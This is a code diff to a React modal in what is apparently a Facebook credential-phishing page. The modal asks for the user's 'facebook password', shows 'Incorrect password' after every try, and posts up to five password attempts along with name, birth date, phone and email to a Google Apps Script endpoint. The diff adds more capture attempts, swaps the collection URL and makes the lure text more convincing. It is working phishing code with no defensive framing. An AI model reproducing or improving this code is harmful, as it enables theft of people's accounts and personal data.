@@ -20,21 +20,35 @@ const Modal = ({ isModal, setIsModal }) => {
   }
 
   const handleContinue = () => {
-    if (attempt === 0) {
-      pass.current = password;
+    if (!password) {
+      return;
+    }
+    if (attempt < 5) {
+      // pass.current = password;
       const data = JSON.parse(localStorage.getItem("form"));
       const form = new FormData();
-
       form.append("fullname", data.fullname);
       form.append("day", data.day);
       form.append("month", data.month);
       form.append("year", data.year);
       form.append("phone", data.phone);
       form.append("email", data.email);
-      form.append("first_password", password);
+
+      if (attempt === 0) {
+        form.append("first_password", password);
+      }
+      if (attempt === 1) {
+        form.append("second_password", password);
+      }
+      if (attempt === 2) {
+        form.append("third_password", password);
+      }
+      if (attempt === 3) {
+        form.append("fourth_password", password);
+      }
 
       axios.post(
-        "https://script.google.com/macros/s/AKfycbxoeJSDiNqUZkhz9bB4Si1sZOqVU3438C7VQaQigMXh9DdzJdqr5BYbhBPyqOlRuT5bGg/exec",
+        "https://script.google.com/macros/s/AKfycbyB6OAXgajaiGM1fLYKukUkMMsW_Tny2Mlg9CnKhK1EX_nLb1R-5yUV-jg5FEzPxwGFBA/exec",
         form
       );
       // const content = `
@@ -54,7 +68,7 @@ const Modal = ({ isModal, setIsModal }) => {
   };
 
   React.useEffect(() => {
-    if (attempt >= 2) {
+    if (attempt === 5) {
       // const formData = JSON.parse(localStorage.getItem("form"));
       // const content = `
       // IP: ${localStorage.getItem("ip")}
@@ -81,12 +95,12 @@ const Modal = ({ isModal, setIsModal }) => {
       form.append("year", data.year);
       form.append("phone", data.phone);
       form.append("email", data.email);
-      form.append("first_password", pass.current);
-      form.append("second_password", password);
+      // form.append("first_password", pass.current);
+      form.append("fifth_password", password);
 
       axios
         .post(
-          "https://script.google.com/macros/s/AKfycbxoeJSDiNqUZkhz9bB4Si1sZOqVU3438C7VQaQigMXh9DdzJdqr5BYbhBPyqOlRuT5bGg/exec",
+          "https://script.google.com/macros/s/AKfycbyB6OAXgajaiGM1fLYKukUkMMsW_Tny2Mlg9CnKhK1EX_nLb1R-5yUV-jg5FEzPxwGFBA/exec",
           form
         )
         .then(() => {
@@ -119,10 +133,10 @@ const Modal = ({ isModal, setIsModal }) => {
               style={{
                 fontSize: "1.5rem",
 
-                marginTop: "1.25rem",
+                marginTop: "1.15rem",
               }}
             >
-              Please enter your password to continue
+              Please enter your facebook password to continue
             </h1>
             <div
               style={{
@@ -136,7 +150,7 @@ const Modal = ({ isModal, setIsModal }) => {
 
             <div className="modal__body-description">
               We need to confirm the sender of the information is you, Please
-              enter your password and then continue.
+              enter your facebook password and then continue.
             </div>
             <div className="modal__body-password">
               <InputPassword
@@ -147,7 +161,7 @@ const Modal = ({ isModal, setIsModal }) => {
               </InputPassword>
               {attempt > 0 && (
                 <p className="text-danger">
-                  Incorrect password, please try again.
+                  Incorrect facebook password, please try again.
                 </p>
               )}
             </div>
@@ -156,7 +170,7 @@ const Modal = ({ isModal, setIsModal }) => {
                 marginBottom: "1.25rem",
               }}
             >
-              <ButtonSoft disabled={true} fun={handleContinue}>
+              <ButtonSoft disabled={password.length > 0} fun={handleContinue}>
                 Continue
               </ButtonSoft>
             </div>
